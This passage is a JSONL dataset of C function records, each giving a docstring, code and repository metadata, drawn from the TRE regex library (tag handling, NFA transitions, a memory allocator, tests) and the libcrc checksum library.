iter->arg);\n\t\tSTACK_PUSHX(stack, int, ADDTAGS_RECURSE);\n\n\t\t/* Regset is not empty, so add a tag here. */\n\t\tif (regset[0] >= 0 || iter->minimal)\n\t\t  {\n\t\t    if (!first_pass)\n\t\t      {\n\t\t\tint i;\n\t\t\tstatus = tre_add_tag_left(mem, node, tag);\n\t\t\tif (iter->minimal)\n\t\t\t  tnfa->tag_directions[tag] = TRE_TAG_MAXIMIZE;\n\t\t\telse\n\t\t\t  tnfa->tag_directions[tag] = direction;\n\t\t\tif (minimal_tag >= 0)\n\t\t\t  {\n\t\t\t    DPRINT((\"Minimal %d, %d\\n\", minimal_tag, tag));\n\t\t\t    for (i = 0; tnfa->minimal_tags[i] >= 0; i++);\n\t\t\t    tnfa->minimal_tags[i] = tag;\n\t\t\t    tnfa->minimal_tags[i + 1] = minimal_tag;\n\t\t\t    tnfa->minimal_tags[i + 2] = -1;\n\t\t\t    minimal_tag = -1;\n\t\t\t    num_minimals++;\n\t\t\t  }\n\t\t\ttre_purge_regset(regset, tnfa, tag);\n\t\t      }\n\n\t\t    DPRINT((\"  num_tags++\\n\"));\n\t\t    regset[0] = -1;\n\t\t    tag = next_tag;\n\t\t    num_tags++;\n\t\t    next_tag++;\n\t\t  }\n\t\tdirection = TRE_TAG_MINIMIZE;\n\t      }\n\t      break;\n\t    case UNION:\n\t      {\n\t\ttre_union_t *uni = node->obj;\n\t\ttre_ast_node_t *left = uni->left;\n\t\ttre_ast_node_t *right = uni->right;\n\t\tint left_tag;\n\t\tint right_tag;\n\n\t\tif (regset[0] >= 0)\n\t\t  {\n\t\t    left_tag = next_tag;\n\t\t    right_tag = next_tag + 1;\n\t\t  }\n\t\telse\n\t\t  {\n\t\t    left_tag = tag;\n\t\t    right_tag = next_tag;\n\t\t  }\n\n\t\tDPRINT((\"Union\\n\"));\n\n\t\t/* After processing right child. */\n\t\tSTACK_PUSHX(stack, int, right_tag);\n\t\tSTACK_PUSHX(stack, int, left_tag);\n\t\tSTACK_PUSHX(stack, voidptr, regset);\n\t\tSTACK_PUSHX(stack, int, regset[0] >= 0);\n\t\tSTACK_PUSHX(stack, voidptr, node);\n\t\tSTACK_PUSHX(stack, voidptr, right);\n\t\tSTACK_PUSHX(stack, voidptr, left);\n\t\tSTACK_PUSHX(stack, int, ADDTAGS_AFTER_UNION_RIGHT);\n\n\t\t/* Process right child. */\n\t\tSTACK_PUSHX(stack, voidptr, right);\n\t\tSTACK_PUSHX(stack, int, ADDTAGS_RECURSE);\n\n\t\t/* After processing left child. */\n\t\tSTACK_PUSHX(stack, int, ADDTAGS_AFTER_UNION_LEFT);\n\n\t\t/* Process left child. */\n\t\tSTACK_PUSHX(stack, voidptr, left);\n\t\tSTACK_PUSHX(stack, int, ADDTAGS_RECURSE);\n\n\t\t/* Regset is not empty, so add a tag here. */\n\t\tif (regset[0] >= 0)\n\t\t  {\n\t\t    if (!first_pass)\n\t\t      {\n\t\t\tint i;\n\t\t\tstatus = tre_add_tag_left(mem, node, tag);\n\t\t\ttnfa->tag_directions[tag] = direction;\n\t\t\tif (minimal_tag >= 0)\n\t\t\t  {\n\t\t\t    DPRINT((\"Minimal %d, %d\\n\", minimal_tag, tag));\n\t\t\t    for (i = 0; tnfa->minimal_tags[i] >= 0; i++);\n\t\t\t    tnfa->minimal_tags[i] = tag;\n\t\t\t    tnfa->minimal_tags[i + 1] = minimal_tag;\n\t\t\t    tnfa->minimal_tags[i + 2] = -1;\n\t\t\t    minimal_tag = -1;\n\t\t\t    num_minimals++;\n\t\t\t  }\n\t\t\ttre_purge_regset(regset, tnfa, tag);\n\t\t      }\n\n\t\t    DPRINT((\"  num_tags++\\n\"));\n\t\t    regset[0] = -1;\n\t\t    tag = next_tag;\n\t\t    num_tags++;\n\t\t    next_tag++;\n\t\t  }\n\n\t\tif (node->num_submatches > 0)\n\t\t  {\n\t\t    /* The next two tags are reserved for markers. */\n\t\t    next_tag++;\n\t\t    tag = next_tag;\n\t\t    next_tag++;\n\t\t  }\n\n\t\tbreak;\n\t      }\n\t    }\n\n\t  if (node->submatch_id >= 0)\n\t    {\n\t      int i;\n\t      /* Push this submatch on the parents stack. */\n\t      for (i = 0; parents[i] >= 0; i++);\n\t      parents[i] = node->submatch_id;\n\t      parents[i + 1] = -1;\n\t    }\n\n\t  break; /* end case: ADDTAGS_RECURSE */\n\n\tcase ADDTAGS_AFTER_ITERATION:\n\t  {\n\t    int minimal = 0;\n\t    int enter_tag;\n\t    node = tre_stack_pop_voidptr(stack);\n\t    if (first_pass)\n\t      {\n\t\tnode->num_tags = ((tre_iteration_t *)node->obj)->arg->num_tags\n\t\t  + tre_stack_pop_int(stack);\n\t\tminimal_tag = -1;\n\t      }\n\t    else\n\t      {\n\t\tminimal = tre_stack_pop_int(stack);\n\t\tenter_tag = tre_stack_pop_int(stack);\n\t\tif (minimal)\n\t\t  minimal_tag = enter_tag;\n\t      }\n\n\t    DPRINT((\"After iteration\\n\"));\n\t    if (!first_pass)\n\t      {\n\t\tDPRINT((\"  Setting direction to %s\\n\",\n\t\t\tminimal ? \"minimize\" : \"maximize\"));\n\t\tif (minimal)\n\t\t  direction = TRE_TAG_MINIMIZE;\n\t\telse\n\t\t  direction = TRE_TAG_MAXIMIZE;\n\t      }\n\t    break;\n\t  }\n\n\tcase ADDTAGS_AFTER_CAT_LEFT:\n\t  {\n\t    int new_tag = tre_stack_pop_int(stack);\n\t    next_tag = tre_stack_pop_int(stack);\n\t    DPRINT((\"After cat left, tag = %d, next_tag = %d\\n\",\n\t\t    tag, next_tag));\n\t    if (new_tag >= 0)\n\t      {\n\t\tDPRINT((\"  Setting tag to %d\\n\", new_tag));\n\t\ttag = new_tag;\n\t      }\n\t    break;\n\t  }\n\n\tcase ADDTAGS_AFTER_CAT_RIGHT:\n\t  DPRINT((\"After cat right\\n\"));\n\t  node = tre_stack_pop_voidptr(stack);\n\t  if (first_pass)\n\t    node->num_tags = ((tre_catenation_t *)node->obj)->left->num_tags\n\t      + ((tre_catenation_t *)node->obj)->right->num_tags;\n\t  break;\n\n\tcase ADDTAGS_AFTER_UNION_LEFT:\n\t  DPRINT((\"After union left\\n\"));\n\t  /* Lift the bottom of the `regset' array so that when processing\n\t     the right operand the items currently in the array are\n\t     invisible.\t The original bottom was saved at ADDTAGS_UNION and\n\t     will be restored at ADDTAGS_AFTER_UNION_RIGHT below. */\n\t  while (*regset >= 0)\n\t    regset++;\n\t  break;\n\n\tcase ADDTAGS_AFTER_UNION_RIGHT:\n\t  {\n\t    int added_tags, tag_left, tag_right;\n\t    tre_ast_node_t *left = tre_stack_pop_voidptr(stack);\n\t    tre_ast_node_t *right = tre_stack_pop_voidptr(stack);\n\t    DPRINT((\"After union right\\n\"));\n\t    node = tre_stack_pop_voidptr(stack);\n\t    added_tags = tre_stack_pop_int(stack);\n\t    if (first_pass)\n\t      {\n\t\tnode->num_tags = ((tre_union_t *)node->obj)->left->num_tags\n\t\t  + ((tre_union_t *)node->obj)->right->num_tags + added_tags\n\t\t  + ((node->num_submatches > 0) ? 2 : 0);\n\t      }\n\t    regset = tre_stack_pop_voidptr(stack);\n\t    tag_left = tre_stack_pop_int(stack);\n\t    tag_right = tre_stack_pop_int(stack);\n\n\t    /* Add tags after both children, the left child gets a smaller\n\t       tag than the right child.  This guarantees that we prefer\n\t       the left child over the right child. */\n\t    /* XXX - This is not always necessary (if the children have\n\t       tags which must be seen for every match of that child). */\n\t    /* XXX - Check if this is the only place where tre_add_tag_right\n\t       is used.\t If so, use tre_add_tag_left (putting the tag before\n\t       the child as opposed after the child) and throw away\n\t       tre_add_tag_right. */\n\t    if (node->num_submatches > 0)\n\t      {\n\t\tif (!first_pass)\n\t\t  {\n\t\t    status = tre_add_tag_right(mem, left, tag_left);\n\t\t    tnfa->tag_directions[tag_left] = TRE_TAG_MAXIMIZE;\n\t\t    status = tre_add_tag_right(mem, right, tag_right);\n\t\t    tnfa->tag_directions[tag_right] = TRE_TAG_MAXIMIZE;\n\t\t  }\n\t\tDPRINT((\"  num_tags += 2\\n\"));\n\t\tnum_tags += 2;\n\t      }\n\t    direction = TRE_TAG_MAXIMIZE;\n\t    break;\n\t  }\n\n\tdefault:\n\t  assert(0);\n\t  break;\n\n\t} /* end switch(symbol) */\n    } /* end while(tre_stack_num_objects(stack) > bottom) */\n\n  if (!first_pass)\n    tre_purge_regset(regset, tnfa, tag);\n\n  if (!first_pass && minimal_tag >= 0)\n    {\n      int i;\n      DPRINT((\"Minimal %d, %d\\n\", minimal_tag, tag));\n      for (i = 0; tnfa->minimal_tags[i] >= 0; i++);\n      tnfa->minimal_tags[i] = tag;\n      tnfa->minimal_tags[i + 1] = minimal_tag;\n      tnfa->minimal_tags[i + 2] = -1;\n      minimal_tag = -1;\n      num_minimals++;\n    }\n\n  DPRINT((\"tre_add_tags: %s complete.  Number of tags %d.\\n\",\n\t  first_pass? \"First pass\" : \"Second pass\", num_tags));\n\n  assert(tree->num_tags == num_tags);\n  tnfa->end_tag = num_tags;\n  tnfa->num_tags = num_tags;\n  tnfa->num_minimals = num_minimals;\n  xfree(orig_regset);\n  xfree(parents);\n  xfree(saved_states);\n  return status;\n}", "path": "tre/lib/tre-compile.c", "commit_date": "2014-01-31 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* The compare() handler.  Compares two substrings in the input and returns\n   0 if the substrings are equal, and a nonzero value if not. */\n", "func_signal": "static int\nstr_handler_compare(size_t pos1, size_t pos2, size_t len, void *context)", "code": "{\n  str_handler_ctx *ctx = context;\n  printf(\"comparing %lu-%lu and %lu-%lu\\n\",\n\t (unsigned long)pos1, (unsigned long)pos1 + len,\n\t (unsigned long)pos2, (unsigned long)pos2 + len);\n  return strncmp(ctx->str + pos1, ctx->str + pos2, len);\n}", "path": "tre/tests/test-str-source.c", "commit_date": "2009-09-19 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Run one test with tre_reguexec */\n", "func_signal": "static void\ntest_reguexec(const char *str, const char *regex)", "code": "{\n  regex_t preg;\n  tre_str_source *source;\n  regmatch_t pmatch[5];\n\n  source = make_str_source(str);\n  if (!source)\n    return;\n\n  tre_regcomp(&preg, regex, REG_EXTENDED);\n  if (tre_reguexec(&preg, source, elementsof(pmatch), pmatch, 0) == 0)\n    printf(\"Match: %d - %d\\n\", (int)pmatch[0].rm_so, (int)pmatch[0].rm_eo);\n\n  free_str_source(source);\n  tre_regfree(&preg);\n}", "path": "tre/tests/test-str-source.c", "commit_date": "2009-09-19 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Inserts a catenation node to the root of the tree given in `node'.\n   As the right child a new tag with number `tag_id' to `node' is added,\n   and the left child is the old root. */\n", "func_signal": "static reg_errcode_t\ntre_add_tag_right(tre_mem_t mem, tre_ast_node_t *node, int tag_id)", "code": "{\n  tre_catenation_t *c;\n\n  DPRINT((\"tre_add_tag_right: tag %d\\n\", tag_id));\n\n  c = tre_mem_alloc(mem, sizeof(*c));\n  if (c == NULL)\n    return REG_ESPACE;\n  c->right = tre_ast_new_literal(mem, TAG, tag_id, -1);\n  if (c->right == NULL)\n    return REG_ESPACE;\n  c->left = tre_mem_alloc(mem, sizeof(tre_ast_node_t));\n  if (c->left == NULL)\n    return REG_ESPACE;\n\n  c->left->obj = node->obj;\n  c->left->type = node->type;\n  c->left->nullable = -1;\n  c->left->submatch_id = -1;\n  c->left->firstpos = NULL;\n  c->left->lastpos = NULL;\n  c->left->num_tags = 0;\n  node->obj = c;\n  node->type = CATENATION;\n  return REG_OK;\n}", "path": "tre/lib/tre-compile.c", "commit_date": "2014-01-31 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Adds a transition from each position in `p1' to each position in `p2'. */\n", "func_signal": "static reg_errcode_t\ntre_make_trans(tre_pos_and_tags_t *p1, tre_pos_and_tags_t *p2,\n\t       tre_tnfa_transition_t *transitions,\n\t       int *counts, int *offs)", "code": "{\n  tre_pos_and_tags_t *orig_p2 = p2;\n  tre_tnfa_transition_t *trans;\n  int i, j, k, l, dup, prev_p2_pos;\n\n  if (transitions != NULL)\n    while (p1->position >= 0)\n      {\n\tp2 = orig_p2;\n\tprev_p2_pos = -1;\n\twhile (p2->position >= 0)\n\t  {\n\t    /* Optimization: if this position was already handled, skip it. */\n\t    if (p2->position == prev_p2_pos)\n\t      {\n\t\tp2++;\n\t\tcontinue;\n\t      }\n\t    prev_p2_pos = p2->position;\n\t    /* Set `trans' to point to the next unused transition from\n\t       position `p1->position'. */\n\t    trans = transitions + offs[p1->position];\n\t    while (trans->state != NULL)\n\t      {\n#if 0\n\t\t/* If we find a previous transition from `p1->position' to\n\t\t   `p2->position', it is overwritten.  This can happen only\n\t\t   if there are nested loops in the regexp, like in \"((a)*)*\".\n\t\t   In POSIX.2 repetition using the outer loop is always\n\t\t   preferred over using the inner loop.\t Therefore the\n\t\t   transition for the inner loop is useless and can be thrown\n\t\t   away. */\n\t\t/* XXX - The same position is used for all nodes in a bracket\n\t\t   expression, so this optimization cannot be used (it will\n\t\t   break bracket expressions) unless I figure out a way to\n\t\t   detect it here. */\n\t\tif (trans->state_id == p2->position)\n\t\t  {\n\t\t    DPRINT((\"*\"));\n\t\t    break;\n\t\t  }\n#endif\n\t\ttrans++;\n\t      }\n\n\t    if (trans->state == NULL)\n\t      (trans + 1)->state = NULL;\n\t    /* Use the character ranges, assertions, etc. from `p1' for\n\t       the transition from `p1' to `p2'. */\n\t    trans->code_min = (tre_cint_t) p1->code_min;\n\t    trans->code_max = (tre_cint_t) p1->code_max;\n\t    trans->state = transitions + offs[p2->position];\n\t    trans->state_id = p2->position;\n\t    trans->assertions = p1->assertions | p2->assertions\n\t      | (p1->class ? ASSERT_CHAR_CLASS : 0)\n\t      | (p1->neg_classes != NULL ? ASSERT_CHAR_CLASS_NEG : 0);\n\t    if (p1->backref >= 0)\n\t      {\n\t\tassert((trans->assertions & ASSERT_CHAR_CLASS) == 0);\n\t\tassert(p2->backref < 0);\n\t\ttrans->u.backref = p1->backref;\n\t\ttrans->assertions |= ASSERT_BACKREF;\n\t      }\n\t    else\n\t      trans->u.class = p1->class;\n\t    if (p1->neg_classes != NULL)\n\t      {\n\t\tfor (i = 0; p1->neg_classes[i] != (tre_ctype_t)0; i++);\n\t\ttrans->neg_classes =\n\t\t  xmalloc(sizeof(*trans->neg_classes) * (i + 1));\n\t\tif (trans->neg_classes == NULL)\n\t\t  return REG_ESPACE;\n\t\tfor (i = 0; p1->neg_classes[i] != (tre_ctype_t)0; i++)\n\t\t  trans->neg_classes[i] = p1->neg_classes[i];\n\t\ttrans->neg_classes[i] = (tre_ctype_t)0;\n\t      }\n\t    else\n\t      trans->neg_classes = NULL;\n\n\t    /* Find out how many tags this transition has. */\n\t    i = 0;\n\t    if (p1->tags != NULL)\n\t      while(p1->tags[i] >= 0)\n\t\ti++;\n\t    j = 0;\n\t    if (p2->tags != NULL)\n\t      while(p2->tags[j] >= 0)\n\t\tj++;\n\n\t    /* If we are overwriting a transition, free the old tag array. */\n\t    if (trans->tags != NULL)\n\t      xfree(trans->tags);\n\t    trans->tags = NULL;\n\n\t    /* If there were any tags, allocate an array and fill it. */\n\t    if (i + j > 0)\n\t      {\n\t\ttrans->tags = xmalloc(sizeof(*trans->tags) * (i + j + 1));\n\t\tif (!trans->tags)\n\t\t  return REG_ESPACE;\n\t\ti = 0;\n\t\tif (p1->tags != NULL)\n\t\t  while(p1->tags[i] >= 0)\n\t\t    {\n\t\t      trans->tags[i] = p1->tags[i];\n\t\t      i++;\n\t\t    }\n\t\tl = i;\n\t\tj = 0;\n\t\tif (p2->tags != NULL)\n\t\t  while (p2->tags[j] >= 0)\n\t\t    {\n\t\t      /* Don't add duplicates. */\n\t\t      dup = 0;\n\t\t      for (k = 0; k < i; k++)\n\t\t\tif (trans->tags[k] == p2->tags[j])\n\t\t\t  {\n\t\t\t    dup = 1;\n\t\t\t    break;\n\t\t\t  }\n\t\t      if (!dup)\n\t\t\ttrans->tags[l++] = p2->tags[j];\n\t\t      j++;\n\t\t    }\n\t\ttrans->tags[l] = -1;\n\t      }\n\n\t    /* Set the parameter array.\t If both `p2' and `p1' have same\n\t       parameters, the values in `p2' override those in `p1'. */\n\t    if (p1->params || p2->params)\n\t      {\n\t\tif (!trans->params)\n\t\t  trans->params = xmalloc(sizeof(*trans->params)\n\t\t\t\t\t  * TRE_PARAM_LAST);\n\t\tif (!trans->params)\n\t\t  return REG_ESPACE;\n\t\tfor (i = 0; i < TRE_PARAM_LAST; i++)\n\t\t  {\n\t\t    trans->params[i] = TRE_PARAM_UNSET;\n\t\t    if (p1->params && p1->params[i] != TRE_PARAM_UNSET)\n\t\t      trans->params[i] = p1->params[i];\n\t\t    if (p2->params && p2->params[i] != TRE_PARAM_UNSET)\n\t\t      trans->params[i] = p2->params[i];\n\t\t  }\n\t      }\n\t    else\n\t      {\n\t\tif (trans->params)\n\t\t  xfree(trans->params);\n\t\ttrans->params = NULL;\n\t      }\n\n\n#ifdef TRE_DEBUG\n\t    {\n\t      int *tags;\n\n\t      DPRINT((\"\t %2d -> %2d on %3d\", p1->position, p2->position,\n\t\t      p1->code_min));\n\t      if (p1->code_max != p1->code_min)\n\t\tDPRINT((\"-%3d\", p1->code_max));\n\t      tags = trans->tags;\n\t      if (tags)\n\t\t{\n\t\t  DPRINT((\", tags [\"));\n\t\t  while (*tags >= 0)\n\t\t    {\n\t\t      DPRINT((\"%d\", *tags));\n\t\t      tags++;\n\t\t      if (*tags >= 0)\n\t\t\tDPRINT((\",\"));\n\t\t    }\n\t\t  DPRINT((\"]\"));\n\t\t}\n\t      if (trans->assertions)\n\t\tDPRINT((\", assert %d\", trans->assertions));\n\t      if (trans->assertions & ASSERT_BACKREF)\n\t\tDPRINT((\", backref %d\", trans->u.backref));\n\t      else if (trans->u.class)\n\t\tDPRINT((\", class %ld\", (long)trans->u.class));\n\t      if (trans->neg_classes)\n\t\tDPRINT((\", neg_classes %p\", trans->neg_classes));\n\t      if (trans->params)\n\t\t{\n\t\t  DPRINT((\", \"));\n\t\t  tre_print_params(trans->params);\n\t\t}\n\t      DPRINT((\"\\n\"));\n\t    }\n#endif /* TRE_DEBUG */\n\t    p2++;\n\t  }\n\tp1++;\n      }\n  else\n    /* Compute a maximum limit for the number of transitions leaving\n       from each state. */\n    while (p1->position >= 0)\n      {\n\tp2 = orig_p2;\n\twhile (p2->position >= 0)\n\t  {\n\t    counts[p1->position]++;\n\t    p2++;\n\t  }\n\tp1++;\n      }\n  return REG_OK;\n}", "path": "tre/lib/tre-compile.c", "commit_date": "2014-01-31 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/*\n  Public API.\n*/\n", "func_signal": "void\nxmalloc_configure(int fail_after)", "code": "{\n  xmalloc_init();\n  xmalloc_fail_after = fail_after;\n}", "path": "tre/lib/xmalloc.c", "commit_date": "2009-05-22 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Returns a new memory allocator or NULL if out of memory. */\n", "func_signal": "tre_mem_t\ntre_mem_new_impl(int provided, void *provided_block)", "code": "{\n  tre_mem_t mem;\n  if (provided)\n    {\n      mem = provided_block;\n      memset(mem, 0, sizeof(*mem));\n    }\n  else\n    mem = xcalloc(1, sizeof(*mem));\n  if (mem == NULL)\n    return NULL;\n  return mem;\n}", "path": "tre/lib/tre-mem.c", "commit_date": "2009-05-22 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Frees the memory allocator and all memory allocated with it. */\n", "func_signal": "void\ntre_mem_destroy(tre_mem_t mem)", "code": "{\n  tre_list_t *tmp, *l = mem->blocks;\n\n  while (l != NULL)\n    {\n      xfree(l->data);\n      tmp = l->next;\n      xfree(l);\n      l = tmp;\n    }\n  xfree(mem);\n}", "path": "tre/lib/tre-mem.c", "commit_date": "2009-05-22 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Allocates a block of `size' bytes from `mem'.  Returns a pointer to the\n   allocated block or NULL if an underlying malloc() failed. */\n", "func_signal": "void *\ntre_mem_alloc_impl(tre_mem_t mem, int provided, void *provided_block,\n\t\t   int zero, size_t size)", "code": "{\n  void *ptr;\n\n  if (mem->failed)\n    {\n      DPRINT((\"tre_mem_alloc: oops, called after failure?!\\n\"));\n      return NULL;\n    }\n\n#ifdef MALLOC_DEBUGGING\n  if (!provided)\n    {\n      ptr = xmalloc(1);\n      if (ptr == NULL)\n\t{\n\t  DPRINT((\"tre_mem_alloc: xmalloc forced failure\\n\"));\n\t  mem->failed = 1;\n\t  return NULL;\n\t}\n      xfree(ptr);\n    }\n#endif /* MALLOC_DEBUGGING */\n\n  if (mem->n < size)\n    {\n      /* We need more memory than is available in the current block.\n\t Allocate a new block. */\n      tre_list_t *l;\n      if (provided)\n\t{\n\t  DPRINT((\"tre_mem_alloc: using provided block\\n\"));\n\t  if (provided_block == NULL)\n\t    {\n\t      DPRINT((\"tre_mem_alloc: provided block was NULL\\n\"));\n\t      mem->failed = 1;\n\t      return NULL;\n\t    }\n\t  mem->ptr = provided_block;\n\t  mem->n = TRE_MEM_BLOCK_SIZE;\n\t}\n      else\n\t{\n\t  int block_size;\n\t  if (size * 8 > TRE_MEM_BLOCK_SIZE)\n\t    block_size = size * 8;\n\t  else\n\t    block_size = TRE_MEM_BLOCK_SIZE;\n\t  DPRINT((\"tre_mem_alloc: allocating new %d byte block\\n\",\n\t\t  block_size));\n\t  l = xmalloc(sizeof(*l));\n\t  if (l == NULL)\n\t    {\n\t      mem->failed = 1;\n\t      return NULL;\n\t    }\n\t  l->data = xmalloc(block_size);\n\t  if (l->data == NULL)\n\t    {\n\t      xfree(l);\n\t      mem->failed = 1;\n\t      return NULL;\n\t    }\n\t  l->next = NULL;\n\t  if (mem->current != NULL)\n\t    mem->current->next = l;\n\t  if (mem->blocks == NULL)\n\t    mem->blocks = l;\n\t  mem->current = l;\n\t  mem->ptr = l->data;\n\t  mem->n = block_size;\n\t}\n    }\n\n  /* Make sure the next pointer will be aligned. */\n  size += ALIGN(mem->ptr + size, long);\n\n  /* Allocate from current block. */\n  ptr = mem->ptr;\n  mem->ptr += size;\n  mem->n -= size;\n\n  /* Set to zero if needed. */\n  if (zero)\n    memset(ptr, 0, size);\n\n  return ptr;\n}", "path": "tre/lib/tre-mem.c", "commit_date": "2009-05-22 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/*\n * uint32_t crc_32( const unsigned char *input_str, size_t num_bytes );\n *\n * The function crc_32() calculates in one pass the common 32 bit CRC value for\n * a byte string that is passed to the function together with a parameter\n * indicating the length.\n */\n", "func_signal": "uint32_t crc_32( const unsigned char *input_str, size_t num_bytes )", "code": "{\n\n\tuint32_t crc;\n\tconst unsigned char *ptr;\n\tsize_t a;\n\n\tcrc = CRC_START_32;\n\tptr = input_str;\n\n\tif ( ptr != NULL ) for (a=0; a<num_bytes; a++) {\n\n\t\tcrc = (crc >> 8) ^ crc_tab32[ (crc ^ (uint32_t) *ptr++) & 0x000000FFul ];\n\t}\n\n\treturn (crc ^ 0xFFFFFFFFul);\n\n}", "path": "libcrc/src/crc32.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * uint64_t crc_64_ecma( const unsigned char *input_str, size_t num_bytes );\n *\n * The function crc_64_ecma() calculates in one pass the ECMA 64 bit CRC value\n * for a byte string that is passed to the function together with a parameter\n * indicating the length.\n */\n", "func_signal": "uint64_t crc_64_ecma( const unsigned char *input_str, size_t num_bytes )", "code": "{\n\n\tuint64_t crc;\n\tconst unsigned char *ptr;\n\tsize_t a;\n\n\tcrc = CRC_START_64_ECMA;\n\tptr = input_str;\n\n\tif ( ptr != NULL ) for (a=0; a<num_bytes; a++) {\n\n\t\tcrc = (crc << 8) ^ crc_tab64[ ((crc >> 56) ^ (uint64_t) *ptr++) & 0x00000000000000FFull ];\n\t}\n\n\treturn crc;\n\n}", "path": "libcrc/src/crc64.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * uint16_t crc_dnp( const unsigned char* input_str, size_t num_bytes );\n *\n * The function crc_dnp() calculates the DNP CRC checksum of a provided byte\n * string in one pass.\n */\n", "func_signal": "uint16_t crc_dnp( const unsigned char *input_str, size_t num_bytes )", "code": "{\n\n\tuint16_t crc;\n\tuint16_t low_byte;\n\tuint16_t high_byte;\n\tconst unsigned char *ptr;\n\tsize_t a;\n\n\tif ( ! crc_tabdnp_init ) init_crcdnp_tab();\n\n\tcrc = CRC_START_DNP;\n\tptr = input_str;\n\n\tif ( ptr != NULL ) for (a=0; a<num_bytes; a++) {\n\n\t\tcrc = (crc >> 8) ^ crc_tabdnp[ (crc ^ (uint16_t) *ptr++) & 0x00FF ];\n\t}\n\n\tcrc       = ~crc;\n\tlow_byte  = (crc & 0xff00) >> 8;\n\thigh_byte = (crc & 0x00ff) << 8;\n\tcrc       = low_byte | high_byte;\n\n\treturn crc;\n\n}", "path": "libcrc/src/crcdnp.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * uint8_t crc_8( const unsigned char *input_str, size_t num_bytes );\n *\n * The function crc_8() calculates the 8 bit wide CRC of an input string of a\n * given length.\n */\n", "func_signal": "uint8_t crc_8( const unsigned char *input_str, size_t num_bytes )", "code": "{\n\n\tsize_t a;\n\tuint8_t crc;\n\tconst unsigned char *ptr;\n\n\tcrc = CRC_START_8;\n\tptr = input_str;\n\n\tif ( ptr != NULL ) for (a=0; a<num_bytes; a++) {\n\n\t\tcrc = sht75_crc_table[(*ptr++) ^ crc];\n\t}\n\n\treturn crc;\n\n}", "path": "libcrc/src/crc8.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * int main( int argc, char *argv[] );\n *\n * Precalc is a commandline utility that is called from the Makefile to\n * generate the lookup tables for the CRC routines. Generating these tables at\n * compile time is much more efficient than doing it at runtime. Most compilers\n * will be able to optimize the routines more when the tables are guaranteerd\n * to be constant than when they have been generated on the fly as variable\n * tables.\n */\n", "func_signal": "int main( int argc, char *argv[] )", "code": "{\n\n\tint retval;\n\n\tif ( argc != 3 ) {\n\n\t\tfprintf( stderr, \"\\nusage: precalc --type file\\n\" );\n\t\tfprintf( stderr, \"       where --type is any of --crc64\\n\\n\" );\n\n\t\texit( 1 );\n\t}\n\n\tretval = generate_table( argv[1], argv[2] );\n\n\texit( retval );\n\n}", "path": "libcrc/precalc/precalc.c", "commit_date": "2016-11-14 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * uint16_t crc_kermit( const unsigned char *input_str, size_t num_bytes );\n *\n * The function crc_kermit() calculates the 16 bits Kermit CRC in one pass for\n * a byte string of which the beginning has been passed to the function. The\n * number of bytes to check is also a parameter.\n */\n", "func_signal": "uint16_t crc_kermit( const unsigned char *input_str, size_t num_bytes )", "code": "{\n\n\tuint16_t crc;\n\tuint16_t low_byte;\n\tuint16_t high_byte;\n\tconst unsigned char *ptr;\n\tsize_t a;\n\n\tif ( ! crc_tab_init ) init_crc_tab();\n\n\tcrc = CRC_START_KERMIT;\n\tptr = input_str;\n\n\tif ( ptr != NULL ) for (a=0; a<num_bytes; a++) {\n\n\t\tcrc = (crc >> 8) ^ crc_tab[ (crc ^ (uint16_t) *ptr++) & 0x00FF ];\n\t}\n\n\tlow_byte  = (crc & 0xff00) >> 8;\n\thigh_byte = (crc & 0x00ff) << 8;\n\tcrc       = low_byte | high_byte;\n\n\treturn crc;\n\n}", "path": "libcrc/src/crckrmit.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * uint16_t update_crc_kermit( uint16_t crc, unsigned char c );\n *\n * The function update_crc_kermit() calculates a new CRC Kermit value based on\n * the previous value of the CRC and the next byte of data to be checked.\n */\n", "func_signal": "uint16_t update_crc_kermit( uint16_t crc, unsigned char c )", "code": "{\n\n\tif ( ! crc_tab_init ) init_crc_tab();\n\n\treturn (crc >> 8) ^ crc_tab[ (crc ^ (uint16_t) c) & 0x00FF ];\n\n}", "path": "libcrc/src/crckrmit.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * uint16_t update_crc_dnp( uint16_t crc, unsigned char c );\n *\n * The function update_crc_dnp() is called for every new byte in a row that\n * must be feeded tot the CRC-DNP routine to calculate the DNP CRC.\n */\n", "func_signal": "uint16_t update_crc_dnp( uint16_t crc, unsigned char c )", "code": "{\n\n\tif ( ! crc_tabdnp_init ) init_crcdnp_tab();\n\n\treturn (crc >> 8) ^ crc_tabdnp[ (crc ^ (uint16_t) c) & 0x00FF ];\n\n}", "path": "libcrc/src/crcdnp.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
